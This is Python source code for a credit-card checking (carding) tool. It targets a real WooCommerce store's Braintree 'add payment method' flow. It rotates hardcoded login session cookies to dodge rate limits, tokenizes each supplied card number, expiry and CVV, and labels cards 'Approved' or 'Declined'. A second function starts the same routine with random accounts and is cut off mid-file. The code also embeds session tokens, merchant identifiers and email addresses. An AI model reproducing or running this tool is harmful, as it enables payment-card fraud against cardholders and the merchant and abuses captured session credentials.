import requests
import re
import random
import time
import string
import base64
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
def notauto(ccx):
  import requests
  ccx = ccx.strip()
  n = ccx.split("|")[0]
  mm = ccx.split("|")[1]
  yy = ccx.split("|")[2]
  cvc = ccx.split("|")[3]
  if "20" in yy:  # Mo3gza
    yy = yy.split("20")[1]
  with open('fileb3.txt', 'r') as file:
    first_line = file.readline()
    print(n,mm,yy,cvc)
    
    last_used_times = {}
    
  while True:
    lines = '''nsiuwhuwuwuquw%7C1727924756%7Caypzf5jbUa1L4UbRNhFVkcUXEWBNduhaH6qKHyLu64g%7C598507a1a9543f360781655e17fa23f0897f43fc084f87e9c7239016f25804ad
sjwmendndx%7C1728491839%7C7wvPZEKc6OmEqlxiMjVvYleJTndZLizRWgwwSbsOqoU%7C1fb0e16f125d8e24a59eaefc6d0afd9d17618c1eb52c042c4120eaddee960d03
snwns%7C1728492179%7CCShnrtIRJsGN6fzpxu8Y1m2oCQ8CG9MK4shBgxwEP6x%7Cf803fda23752deda1b01a389e967f404aaa9b0044b2d54c9364391b1a6f99f7f
snenfncn%7C1728492877%7CJUAOzVTco1DfiAHugapk6JUbYIQWf2qsZNdjzg99TB8%7C9073b029fc5184294f090efe15ba1aa088e926992e9148add9a2aea6e26d5984
skssjdjd%7C1728493132%7CFLplcjkw4mZvETALVoIobVhpMrilhaIMcqUEPMwteX7%7C100bce6df21357cc21fa629f3cf3b72c0afb622750acb8984cface4a299b8fa4
gaihe7wu72u%7C1727925171%7C9Q1K0IWIsC9ICPyZR1vqDlkKC1NNNzosFxy1GPZbQCe%7C0a5bbf583414c69054b3ca32cf761ce4810b6a6ecae8ba4213e78435cd3b46d2
aman44%7C1727922535%7CgpRGVt9nhaAxCzrJu2okQKPhgf5HNWWCnXRgm0KbzcA%7Ccccf5fd924a1c201e7097e89cce934adff868cf38ef01746ee527f043a8a5245
728yey9eh2%7C1727922881%7Cn3ElIZU6x5oE47f8MDfnF6xR3SgLE8J2LXNUd6c98gQ%7C4ad190c5531514c3becb2ebb6411199945a6bf4db9ba3b1ac162c9d49bcb2c54
mliwhkwi7y6t%7C1727923066%7CrL0OCqGAmt8XvAIRZdd6dPXAeYEpNoQpYSbber8vgVA%7C580634fe224dff320109440b9e5eb9002fef3f7a618d8d7da9e6c74a3f293dd3
cheetah562%7C1727079048%7CSc6ihZQZ1px24rKLGX8NcttHNjt4WlEBwo20xBCsOMx%7Cfaa03bb47747f8d60a6d4e03068214a34eee6a6fd09610861e9047cbb457a494
mkiwvva7u926%7C1727923356%7ClJGl4ZjKYULba8Fvt0wtY9NqbvQL30P97xn6mRG5bxW%7C87f42c8a9a5deeee9145e8cba82eca6b64ed0eb81265677d13bfbd6baf74b2fb
jakuwyuuwvhgew%7C1727923639%7CgVhn7Zx6G6LUXDcIaivKH9NwzcEjheyhqNKQ6DLkgS8%7C55bddf401da3c2d712ed2f5576b07be3821d594e6eb5609f85dc4a7be678d7c0
haiiee3ee%7C1727923806%7CTT98bzQoBPt3RUsEbgxn2gEmiDgVVwrqlgISOWoEQQy%7C9ff71863f26ad3465f19b830eee63e36ca7fe460f62192c5ed49634630a21b06
bskikehbsjje%7C1727924048%7Cb7cqMjZi89KXjEcqMkPQSHeKcGCXOgKAlBkiZDVey8o%7Cc0245b17b74fec4f0625880fe2cf8414134431b777607e58a84a6f4b4d884a9e
hakiwh8wueiey%7C1727924218%7Cir7lhr071e9G2EkxuJZGY0VmWDIlADaJgXZXQZcZTbW%7Cb500d907a002d6545ec7e1063d6d821d83abf1e49e7ab2bd56f7042abf4c0373
aman49728374%7C1727924373%7CFqlfRcYrYPCjSashGJUo3tsskfHPPAgPh0Y3jCr6ZMs%7Cfa04f1a52574f0ad724a93b3550ae7f341c8178ddcd8220190a342a7eb44b4ae
aman8uhshw244%7C1727924587%7C9362JFnEXRELsJbhutqhW2cTuxBWQAPxvRjKUySW7Mi%7C26ef128fcaf597504a35e7818f4bfb7b88d63bbf121f381a3e11828b5b4ad601
jaksw552%7C1727406278%7CH99UqFdY7fGps4e8gz6GMzKycl2Xsw4xjvxnsITZFLb%7C4742e806de31424233ba08f914795b316c158c51515227788de9803ca4001e0f
cheetarandi11%7C1727407650%7CdZbCXjwFMCsoXhZjBv51OW14KWLquS1ca6eZ7fGCOJD%7Cb68b10590d89ecdc91bd79b7d49aa3f8dc91999c2c76dba6792e62486a0d2fe2
cheetarandi%7C1727406951%7CDnL41lp4X4y1jJhwE73kgR3BlsImuDCgoHi9EwbEBRl%7Cab5fe8ee5a0882e1b40867257c0745512e3d9ae5a1ebc376a2f0ab169fa563bc
cheetdddsarandi%7C1727422009%7CHFTDAshOxxtKlWVmrKBO9SDEMgcTodwGs3hk5ODcKoH%7C08d2b82aeaa8a5cbf46346351ff41988ce1fe80cb917f286c25e006b5e376f95
chegghetarandi%7C1727421569%7CTwm5XFruIc94tVMX5NCTLYTV2oI9EAcPQUfGMHlJHw7%7C110675f40a9f1f197c0713c5145125ad0cae13399b535860ad62216dfc8aafde
cheenznnjstarandi%7C1727514589%7CBXOZq4vI9yhbWBgSCXV4AkKnXAwzPQSvFpjLeNrxSui%7Cea0850d8955cccb0295c9df45e516c137af3d8d95297d67a6177501e114a837b
chsbsbeetarandi%7C1727514970%7CNdrJ17XaSo20AznRNRcQ8ugdJtLtX3GdrAJlDDGHqJz%7C8d9333bbda532bc170310ac33efc26556b34abad96b02152f741901d1817cd27
chenzmlzkazvetarandi%7C1727515754%7C3GsL4zfnaiXz4dUyGAIrgPRTnZrYRxuCWRwCExIW8yO%7Ccc77c7ed87cd47d9882ca8ebd4b04989e17e5fdbbbf374cb8c0a827f3447d967'''
    lines = lines.strip().split('\n')
    random_line_number = random.randint(0, len(lines) - 1)
    big = lines[random_line_number]
    current_time = time.time()
    if big in last_used_times:
	        time_since_last_use = current_time - last_used_times[big]
	        if time_since_last_use < 20:
	            	         
	            continue
    if big == first_line:
      pass
    else:
        last_used_times[big] = current_time
        break
  with open('fileb3.txt', 'w') as file:
    file.write(big)
    print(big)
  cookies = {
    'mailchimp_landing_site': 'https%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F',
    'PHPSESSID': '9922c106453b1b91f13b2aa5380a2d90',
    '_ga': 'GA1.1.445964708.1725851995',
    '_omappvp': '1FylfETbUsAv2mvBvo75WElCNa3tluVpLVgTQCjt3eS8TLv55yYDCZ39ee9FADk3R7PJGAfafARgcCD6AWcpvmQILtr73BN2',
    '_fbp': 'fb.1.1725851998020.953269146937982147',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-09-09%2002%3A49%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-09-09%2002%3A49%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'mtk_src_trk': '{"type":"typein","url":"(none)","utm_campaign":"(none)","utm_source":"(direct)","utm_medium":"(none)","utm_content":"(none)","utm_id":"(none)","utm_term":"(none)","session_entry":"https://www.studynotesaba.com/my-account/add-payment-method/","session_start_time":"2024-09-09 02:49:58","session_pages":"2","session_count":"1"}',
    'cookielawinfo-checkbox-necessary': 'yes',
    'CookieLawInfoConsent': 'eyJuZWNlc3NhcnkiOnRydWV9',
    'viewed_cookie_policy': 'yes',
    'wordpress_logged_in_76bec00f9541eed79fabb1ee44a35b76': big,
    'tk_ai': 'JIy%2BpgomdEccIPNxoN8V1fTc',
    '_tt_enable_cookie': '1',
    '_ttp': 'XSSScJcwhDPZSzCIQrl0SkubI_v',
    'mailchimp.cart.previous_email': 'nejwjjw@gmaul.com',
    'mailchimp.cart.current_email': 'aman44@gmail.com',
    'mailchimp_user_previous_email': 'aman44%40gmail.com',
    'mailchimp_user_email': 'aman44%40gmail.com',
    '_ga_SGEGXEGQDY': 'GS1.1.1725851994.1.1.1725852841.60.0.0',
    '_ga_WNQMQBX793': 'GS1.1.1725851997.1.1.1725852842.60.0.0',
    'sbjs_session': 'pgs%3D42%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fpayment-methods%2F',
    'tk_qs': '',
    '_omappvs': '1725852843982',
}

  headers = {
    'authority': 'www.studynotesaba.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F; PHPSESSID=9922c106453b1b91f13b2aa5380a2d90; _ga=GA1.1.445964708.1725851995; _omappvp=1FylfETbUsAv2mvBvo75WElCNa3tluVpLVgTQCjt3eS8TLv55yYDCZ39ee9FADk3R7PJGAfafARgcCD6AWcpvmQILtr73BN2; _fbp=fb.1.1725851998020.953269146937982147; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-09%2002%3A49%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-09%2002%3A49%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; mtk_src_trk={"type":"typein","url":"(none)","utm_campaign":"(none)","utm_source":"(direct)","utm_medium":"(none)","utm_content":"(none)","utm_id":"(none)","utm_term":"(none)","session_entry":"https://www.studynotesaba.com/my-account/add-payment-method/","session_start_time":"2024-09-09 02:49:58","session_pages":"2","session_count":"1"}; cookielawinfo-checkbox-necessary=yes; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWV9; viewed_cookie_policy=yes; wordpress_logged_in_76bec00f9541eed79fabb1ee44a35b76=nejwjjw%7C1727061642%7CQhgPigXOtGtMm5jc8Dc0YzfR9EFcN7ACHdnxdpFg73B%7C4ee2f46b011bcfefe08f1cefc579bd0a1995fb67d5df494613acd5d33bc51a2d; tk_ai=JIy%2BpgomdEccIPNxoN8V1fTc; _tt_enable_cookie=1; _ttp=XSSScJcwhDPZSzCIQrl0SkubI_v; mailchimp.cart.previous_email=nejwjjw@gmaul.com; mailchimp.cart.current_email=aman44@gmail.com; mailchimp_user_previous_email=aman44%40gmail.com; mailchimp_user_email=aman44%40gmail.com; _ga_SGEGXEGQDY=GS1.1.1725851994.1.1.1725852841.60.0.0; _ga_WNQMQBX793=GS1.1.1725851997.1.1.1725852842.60.0.0; sbjs_session=pgs%3D42%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fpayment-methods%2F; tk_qs=; _omappvs=1725852843982',
    'referer': 'https://www.studynotesaba.com/my-account/payment-methods/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

  response = requests.get('https://www.studynotesaba.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
  add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
  enc = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text).group(1)
  dec = base64.b64decode(enc).decode('utf-8')
  au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
  print(au)

  headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

  json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'a9bf5370-61fe-4efd-ba89-65d47f2c4a14',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
                'billingAddress': {
                    'postalCode': '10080',
                    'streetAddress': 'Near Walmart 45',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

  response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
  tok = response.json()['data']['tokenizeCreditCard']['token']
  print(tok)

  cookies = {
    'mailchimp_landing_site': 'https%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F',
    'PHPSESSID': '9922c106453b1b91f13b2aa5380a2d90',
    '_ga': 'GA1.1.445964708.1725851995',
    '_omappvp': '1FylfETbUsAv2mvBvo75WElCNa3tluVpLVgTQCjt3eS8TLv55yYDCZ39ee9FADk3R7PJGAfafARgcCD6AWcpvmQILtr73BN2',
    '_fbp': 'fb.1.1725851998020.953269146937982147',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-09-09%2002%3A49%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-09-09%2002%3A49%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    'mtk_src_trk': '{"type":"typein","url":"(none)","utm_campaign":"(none)","utm_source":"(direct)","utm_medium":"(none)","utm_content":"(none)","utm_id":"(none)","utm_term":"(none)","session_entry":"https://www.studynotesaba.com/my-account/add-payment-method/","session_start_time":"2024-09-09 02:49:58","session_pages":"2","session_count":"1"}',
    'cookielawinfo-checkbox-necessary': 'yes',
    'CookieLawInfoConsent': 'eyJuZWNlc3NhcnkiOnRydWV9',
    'viewed_cookie_policy': 'yes',
    'wordpress_logged_in_76bec00f9541eed79fabb1ee44a35b76': big,
    'tk_ai': 'JIy%2BpgomdEccIPNxoN8V1fTc',
    '_tt_enable_cookie': '1',
    '_ttp': 'XSSScJcwhDPZSzCIQrl0SkubI_v',
    'mailchimp.cart.previous_email': 'nejwjjw@gmaul.com',
    'mailchimp.cart.current_email': 'aman44@gmail.com',
    'mailchimp_user_previous_email': 'aman44%40gmail.com',
    'mailchimp_user_email': 'aman44%40gmail.com',
    '_ga_SGEGXEGQDY': 'GS1.1.1725851994.1.1.1725853463.60.0.0',
    '_ga_WNQMQBX793': 'GS1.1.1725851997.1.1.1725853465.60.0.0',
    '_omappvs': '1725853465873',
    'sbjs_session': 'pgs%3D51%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F',
    'tk_qs': '',
}

  headers = {
    'authority': 'www.studynotesaba.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F; PHPSESSID=9922c106453b1b91f13b2aa5380a2d90; _ga=GA1.1.445964708.1725851995; _omappvp=1FylfETbUsAv2mvBvo75WElCNa3tluVpLVgTQCjt3eS8TLv55yYDCZ39ee9FADk3R7PJGAfafARgcCD6AWcpvmQILtr73BN2; _fbp=fb.1.1725851998020.953269146937982147; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-09%2002%3A49%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-09%2002%3A49%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; mtk_src_trk={"type":"typein","url":"(none)","utm_campaign":"(none)","utm_source":"(direct)","utm_medium":"(none)","utm_content":"(none)","utm_id":"(none)","utm_term":"(none)","session_entry":"https://www.studynotesaba.com/my-account/add-payment-method/","session_start_time":"2024-09-09 02:49:58","session_pages":"2","session_count":"1"}; cookielawinfo-checkbox-necessary=yes; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWV9; viewed_cookie_policy=yes; wordpress_logged_in_76bec00f9541eed79fabb1ee44a35b76=nejwjjw%7C1727061642%7CQhgPigXOtGtMm5jc8Dc0YzfR9EFcN7ACHdnxdpFg73B%7C4ee2f46b011bcfefe08f1cefc579bd0a1995fb67d5df494613acd5d33bc51a2d; tk_ai=JIy%2BpgomdEccIPNxoN8V1fTc; _tt_enable_cookie=1; _ttp=XSSScJcwhDPZSzCIQrl0SkubI_v; mailchimp.cart.previous_email=nejwjjw@gmaul.com; mailchimp.cart.current_email=aman44@gmail.com; mailchimp_user_previous_email=aman44%40gmail.com; mailchimp_user_email=aman44%40gmail.com; _ga_SGEGXEGQDY=GS1.1.1725851994.1.1.1725853463.60.0.0; _ga_WNQMQBX793=GS1.1.1725851997.1.1.1725853465.60.0.0; _omappvs=1725853465873; sbjs_session=pgs%3D51%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F; tk_qs=',
    'origin': 'https://www.studynotesaba.com',
    'referer': 'https://www.studynotesaba.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

  data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': tok,
    'braintree_cc_device_data': '{"device_session_id":"f69b3f7256207f3e24d009cfb9bedb49","fraud_merchant_id":null,"correlation_id":"a9bf5370-61fe-4efd-ba89-65d47f2c"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/fsqwv5czpsr7wnqc/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/fsqwv5czpsr7wnqc"},"merchantId":"fsqwv5czpsr7wnqc","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"fsqwv5czpsr7wnqc","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Study Notes ABA LLC","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjU5Mzk4NjksImp0aSI6ImM1YjMwNDI4LTFiMDctNDViNy05MmU0LWFmMGM4MDU5M2IxZSIsInN1YiI6ImZzcXd2NWN6cHNyN3ducWMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImZzcXd2NWN6cHNyN3ducWMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCJdLCJvcHRpb25zIjp7fX0.fL5sViWnI6rhanmOeECeJRssG71O68zmtNgZejGPhsp0_a_lkYejo5nbxwQG0SzE7D7JR42QQg7Lf3ukCF_mSw","paypalClientId":"AdK9MKiret3zcVK9VufGNTD9wp47RxRz4Cx_YlrHe0beIfHzkHbwy3naaP0NrI7ZJ-ZNQ7s7c1eEIsbY","supportedNetworks":["visa","mastercard","amex","discover"]},"paypalEnabled":true,"paypal":{"displayName":"Study Notes ABA LLC","clientId":"AdK9MKiret3zcVK9VufGNTD9wp47RxRz4Cx_YlrHe0beIfHzkHbwy3naaP0NrI7ZJ-ZNQ7s7c1eEIsbY","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"studynotesaballc_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
    'woocommerce-add-payment-method-nonce': add_nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

  response = requests.post(
    'https://www.studynotesaba.com/my-account/add-payment-method/',
    cookies=cookies,
    headers=headers,
    data=data,
)
  text = response.text
  pattern = r'Reason: (.+?)\s*</li>'
  match = re.search(pattern, text)
  if match:
    result = match.group(1)
  else:
    if 'Payment method successfully added.' in text:
      result = "1000: Approved"
    elif 'risk_threshold' in text:
      result = "Gateway Rejected: Risk Threshold"
    elif 'Please wait for 20 seconds.' in text:      
      result = "Sᴘᴀᴍ Dᴇᴛᴇᴄᴛᴇᴅ"
    else:
      result = "Declined"
      print(dead)
  if 'avs' in result or '1000: Approved' in result or 'Duplicate' in result or 'Insufficient Funds' in result or 'invaild postal code' in result:
     return 'Approved'
     print(added)
  else:
     return result
     
     
import requests
import re
import time
import random
import string
import base64
from bs4 import BeautifulSoup
import user_agent
import pyfiglet
import os
import webbrowser
from colorama import Fore
from getuseragent import UserAgent
from tqdm import tqdm



def Tele3(ccx):
  import requests
  import re
  import random
  import string
  import base64
  from getuseragent import UserAgent
  from user_agent import generate_user_agent

  ccx=ccx.strip()
  #ccx = g.strip().split('\n')[0]
  ccx = ccx.strip()
  parts = re.split(r'[ |/]', ccx)
  n = parts[0]
  mm = parts[1]
  yy = parts[2]
  cvc = parts[3]

  print(n,mm,yy,cvc)

  r = requests.session()
  user = user_agent.generate_user_agent()

  def generate_random_account():
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=4))

    return f"{name}{number}@yahoo.com"
  acc = (generate_random_account())


  def username():
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=20))

    return f"{name}{number}"
  username = (username())

  def generate_random_code(length=32):
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for _ in range(length))

  corr = generate_random_code()

  sess = generate_random_code()

  headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
